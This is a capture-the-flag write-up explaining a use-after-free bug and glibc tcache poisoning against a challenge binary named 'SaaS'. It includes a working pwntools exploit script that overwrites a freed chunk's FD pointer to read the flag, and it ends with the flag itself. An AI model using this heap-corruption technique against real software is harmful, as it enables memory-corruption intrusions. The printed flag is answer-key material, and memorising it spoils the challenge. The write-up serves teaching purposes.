## Idea: Use UAF and GLIBC Tcache Posioning attack to get the flag

## Understanding UAF

UAF means Use After Free. It is exactly what it means. You use a chunk that is already freed, but not set to NULL, which is highly beneficial for us.

## Tcache

What happens to a chunk after it is freed? It is put in the tcache, which is a linked list. That means the first item points to the next one and so on. Tcache is LIFO: Last In First Out. If you call malloc(0x20) and there is a freed chunk in the tcache whose size is also 0x20, it is given to the malloc and removed from the tcache.

## Example to understand Tcache

Let's start with an example. If "a" and "b" are malloc(0x20) and I free "a" and then "b", the tcache would be [b -> a]. I can say that [b -> a -> 0x0] because there is nothing else freed. Also note that if I call malloc(0x20) now, I would get the same pointer as "b". So if "c" is malloc(0x20), "c" and "b" are pointing to the same address. Because tcache is a linkedlist, somewhere in "b" is the address of "a".

## Tcache Posioning explanation

In this code, I can write data after the chunk has been freed. If I can somehow change the address of the next pointer in "b" to the flag address, and then call malloc, it will point to "b", and then call malloc again, it will be pointing to the flag!

## Structure of a freed chunk

The freed chunk starts with some important data, which includes the size of the chunk, the FD (pointer to the next item in the linkedlist) and some other stuff. In this exploit, we will be overwriting the FD pointer.

## Exploiting

I can write in "b" after it is freed and change the FD pointer, which is currently the address of "a", to the flag address. Then, the tcache would be [b-> flag] instead of [b -> a]. Now if I call another malloc(0x20), which is "c", the tcache would become [flag]. I can call another malloc(0x20), which will return a chunk at the address of the flag. It now becomes possible to read the flag by accessing this newly created chunk. Note that because flag is too big, we have to run the script three times with flag address, flag address + 8, and flag address + 16

## Solve Script

```py
## ===== Setup =====
from pwn import *
elf = context.binary = ELF('./SaaS')
io = elf.process()

## ===== Flag Adress =====
flag_addr = (io.readline().strip()[54:]).decode()
flag_addr = int(flag_addr,16)

## ===== Functions to create, write, and delete datd =====
def create(idx):
    io.sendline(b'1')
    io.sendline(str(idx).encode())
    return 0

def write(idx,data):
    io.sendline(b'2')
    io.sendline(str(idx).encode())
    io.sendline(data)
    return 0

def delete(idx):
    io.sendline(b'4')
    io.sendline(str(idx).encode())
    return 0

## ===== Exploit =====
create(0)
create(1)
delete(0)
delete(1)
write(1, pack(flag_addr))
create(2)
create(3)
io.interactive()
```

Once you get interactive, read the third index to get flag.

Run the above script three times but make these changes:

1. write(1,pack(flag_addr))
2. write(1,pack(flag_addr+8))
3. write(1,pack(flag_addr+16))

# Flag: ictf{UAF_ftw_7fde1a2b6}